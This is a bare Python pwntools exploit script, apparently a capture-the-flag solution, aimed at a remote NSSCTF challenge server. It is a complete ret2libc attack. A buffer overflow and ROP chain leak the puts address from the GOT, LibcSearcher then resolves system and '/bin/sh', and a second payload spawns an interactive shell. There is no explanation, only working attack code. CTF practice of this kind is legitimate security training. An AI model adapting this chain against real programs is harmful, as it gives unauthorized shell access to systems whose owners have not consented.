from pwn import*
from LibcSearcher import*
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','split','-h'])
io = remote('node4.anna.nssctf.cn',29570)
#io = process('./whitegive')
elf = ELF('111')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']
pop_rdi = 0x0400763 

payload = b'a'*(0x10+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)

io.sendline(payload)

puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh=libc_base + libc.dump('str_bin_sh')
payload = b'a'*(0x10+8)+p64(pop_rdi)+p64(binsh)+p64(system)

io.send(payload)

io.interactive()